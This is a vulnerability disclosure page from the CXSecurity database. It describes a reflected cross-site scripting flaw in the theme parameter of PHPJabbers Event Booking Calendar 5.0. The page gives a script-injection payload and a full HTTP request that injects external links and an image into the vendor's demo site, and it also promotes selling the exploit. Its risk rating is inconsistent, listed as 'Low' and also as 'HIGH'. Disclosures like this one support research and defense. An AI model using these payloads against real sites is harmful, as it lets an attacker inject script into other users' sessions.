---
title: Event Booking Calendar-5.0 Cross-site scripting (reflected)
url: https://cxsecurity.com/issue/WLB-2026050008
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-05-13
fetch_date: 2026-05-14T05:45:30.817309
---

# Event Booking Calendar-5.0 Cross-site scripting (reflected)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Event Booking Calendar-5.0 Cross-site scripting (reflected)**  **2026.05.13**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

## Titles: Event Booking Calendar-5.0 Cross-site scripting (reflected)
## Author: nu11secur1ty
## Date: 5/13/2026
## Vendor: https://www.phpjabbers.com/
## Software: https://www.phpjabbers.com/event-booking-calendar/
## Reference: https://portswigger.net/web-security/cross-site-scripting
## Description:
The value of the theme request parameter is copied into the value of an HTML tag attribute which is encapsulated in double quotation marks.
The payload a6kx6"><script>alert(1)</script>po9g6 was submitted in the theme parameter. This input was echoed unmodified in the application's response.
This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.
STATUS: HIGH- Vulnerability
[+]Exploit:
```
GET /scripts/event-booking-calendar/preview.php?locale=1&hide=0&theme=theme1a6kx6%22%3E%3Ca%20href=%22https://www.youtube.com/watch?v=Q9pX-pEAFT4%22%20target=%22\_blank%22%3E%20%3Cimg%20src=%22https://media1.tenor.com/m/sLjUbG5BVikAAAAd/trump-dance-trump-2024.gif%22%20alt=%22STUPID%22width=%22900%22%20height=%22450%22%3E%20%3C/a%3Epo9g6 HTTP/2
Host: demo.phpjabbers.com
Cookie: EventBookingCalendar=179dabd0dc4c6897881b9496ceeaa53a
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
```
##[+]Buy the Exploit if you need and if you want to support me:
[href](https://venvar.gumroad.com/l/jrzzmg)
## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/2026/PHPJABBERS/Event-Booking-Calendar-5.0-Cross-site-scripting(reflected))
## Demo PoC:
[href](https://www.patreon.com/posts/event-booking-5-158137115)
## Time spent:
01:27:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
home page: https://www.asc3t1c-nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <https://nu11secur1ty.blogspot.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026050008)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top